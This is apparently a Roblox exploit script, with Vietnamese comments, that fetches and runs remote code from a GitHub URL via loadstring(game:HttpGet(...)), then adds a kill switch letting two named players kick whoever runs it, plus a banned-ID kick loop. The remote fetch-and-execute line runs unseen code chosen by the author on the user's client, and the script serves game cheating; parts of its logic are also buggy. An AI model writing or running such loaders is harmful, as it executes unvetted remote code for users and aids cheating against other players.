local Players = game:GetService("Players")
local authorizedPlayers = { "linhmc_new", "Exile_five" } -- Danh sách người chơi có quyền
local bannedPlayerIds = { 4399722659, 7243465729 } -- Danh sách ID của người chơi bị cấm

-- Execute loadstring
loadstring(game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Build-and-battle-tp/refs/heads/main/Linked"))()

-- Kiểm tra người chơi khi họ execute script
local localPlayer = Players.LocalPlayer

-- Kiểm tra nếu người chơi có ID bị cấm
for _, player in ipairs(Players:GetPlayers()) do
    if table.find(bannedPlayerIds, player.UserId) then
        -- Kick người chơi nếu ID có trong danh sách bị cấm
        player:Kick("You have been banned from this script")
    end
end

-- Hàm để kiểm tra chat của người chơi
local function checkChat(player)
    player.Chatted:Connect(function(message)
        -- Kiểm tra nếu người chơi là "linhmc_new" hoặc "Exile_five" và chat "."
        if table.find(authorizedPlayers, player.Name:lower()) and message == "." then
            -- Kick người chạy script nếu có người tên trong danh sách chat "."
            localPlayer:Kick("._.")
        end
    end)
end

-- Kết nối sự kiện Chatted cho tất cả người chơi
for _, player in ipairs(Players:GetPlayers()) do
    checkChat(player)
end

-- Kết nối cho những người chơi mới tham gia
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        checkChat(player)
    end)
end)

-- Kiểm tra liên tục cho những người chơi mới
Players.PlayerAdded:Connect(checkChat)
